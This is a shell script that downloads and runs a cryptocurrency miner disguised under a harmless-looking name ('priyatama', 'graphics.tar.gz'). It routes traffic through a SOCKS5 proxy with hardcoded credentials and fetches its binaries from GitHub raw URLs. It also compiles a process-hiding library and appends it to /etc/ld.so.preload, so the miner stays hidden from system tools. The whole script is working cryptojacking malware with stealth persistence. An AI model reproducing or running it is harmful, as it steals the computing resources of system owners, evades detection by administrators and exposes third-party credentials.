#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 209.127.191.180:9279
socks5_username = dsutusgj
socks5_password = cyudbzt4njop
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
POOL=ethash.poolbinance.com:1800
WALLET=teguhcong
WORKER=$(echo $(shuf -i 10-40 -n 1)-MAGIC)

./graftcp/graftcp wget https://github.com/hunzibao/tmp/raw/main/magicPriyatama.zip
unzip magicPriyatama.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
